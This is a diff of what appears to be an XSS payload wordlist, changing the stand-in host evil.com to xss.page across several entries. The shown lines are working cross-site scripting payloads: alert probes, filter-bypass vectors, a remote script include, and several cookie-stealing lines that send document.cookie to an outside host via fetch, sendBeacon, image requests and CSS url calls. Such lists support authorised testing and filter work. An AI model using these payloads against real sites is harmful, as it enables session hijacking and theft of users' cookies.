@@ -12,7 +12,7 @@
 
 <script>alert(1)</script>
 <script>alert(document.domain)</script>
-<script src="//evil.com/xss.js"></script>
+<script src="//xss.page/xss.js"></script>
 <img src=x onerror=alert(1)>
 <body onload=alert(1)>
 <svg onload=alert(1)>
@@ -58,8 +58,8 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
 <math><mi//xlink:href="data:x,<script>alert(1)</script>">
 <img src=x:alert(1) onerror=eval(src) alt=``,``>
 <style>@import'javascript:alert(1)';</style>
-<img src onerror="fetch('//evil.com?'+document.cookie)">
-<img src onerror="navigator.sendBeacon('//evil.com',document.cookie)">
+<img src onerror="fetch('//xss.page?'+document.cookie)">
+<img src onerror="navigator.sendBeacon('//xss.page',document.cookie)">
 <script>import('data:text/javascript,alert(1)')</script>
 <iframe srcdoc="<script>parent.alert(1)</script>">
 <select onfocus=alert(1) autofocus>
@@ -149,9 +149,9 @@ onerror=alert(1)>
 <a href="javascript:alert(1)">Click me</a>
 <form><button formaction=javascript:alert(1)>Click</button>
 <script>alert(1)</script>
-<script>fetch("//evil.com?"+document.cookie)</script>
-<script>new Image().src="//evil.com?"+document.cookie</script>
-<script>navigator.sendBeacon("//evil.com",document.cookie)</script>
+<script>fetch("//xss.page?"+document.cookie)</script>
+<script>new Image().src="//xss.page?"+document.cookie</script>
+<script>navigator.sendBeacon("//xss.page",document.cookie)</script>
 <script>XMLHttpRequest.prototype.open=function(){alert(1)}</script>
 <script>Object.defineProperty(document,"cookie",{get:function(){alert(1)}})</script>
 <script>navigator.serviceWorker.register("evil.js")</script>
@@ -160,5 +160,5 @@ onerror=alert(1)>
 " onmouseover=alert(1) "
 " onbegin=alert(1) "
 <script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0]))</script>
-<style>@import url(//evil.com/?data);</style>
-<style>*{background:url(//evil.com/?data)}</style>
+<style>@import url(//xss.page/?data);</style>
+<style>*{background:url(//xss.page/?data)}</style>
